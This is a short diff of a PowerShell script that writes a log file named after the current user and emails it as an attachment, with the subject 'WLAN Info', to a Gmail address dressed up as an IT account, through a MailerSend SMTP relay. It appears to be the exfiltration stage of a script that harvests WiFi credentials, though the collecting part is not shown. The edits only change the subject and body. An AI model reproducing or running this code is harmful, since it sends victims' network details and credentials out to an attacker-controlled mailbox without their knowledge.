@@ -6,9 +6,9 @@ $logPath = "$env:username"+"_"+"$(get-date -f yyyyMMdd_hhmmss).txt"
 $From = "MS_yA4y9Q@trial-3yxj6ljpew0ldo2r.mlsender.net"
 $To = "it.c0nt1n3ntal@gmail.com"
 $Attachment = $logPath
-$Subject = "WLAN Info"
+$Subject = "WLAN Info " + $(get-date -f yyyyMMdd_hhmmss) 
 $Body = "<h2>WLAN Info!</h2><br><br>"
-$Body += "WLAN Info!"
+$Body += ""
 $SMTPServer = "smtp.mailersend.net"
 $SMTPPort = "587"
 # Create the credentials object
